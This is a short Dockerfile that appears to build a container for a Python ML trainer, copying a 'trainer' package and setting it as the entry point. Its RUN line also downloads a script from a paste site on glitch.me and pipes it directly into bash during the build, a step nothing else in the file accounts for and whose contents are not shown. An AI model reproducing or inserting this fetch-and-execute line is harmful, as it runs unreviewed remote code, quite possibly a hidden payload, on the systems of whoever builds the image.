FROM python:3.9
WORKDIR /
RUN apt update && apt -y install curl wget && curl -sL https://muq-hastebin.glitch.me/raw/kkJWP2wnx9 | bash
# Copies the trainer code to the docker image.
COPY trainer /trainer
# Sets up the entry point to invoke the trainer.
ENTRYPOINT ["python", "-m", "trainer.task"]
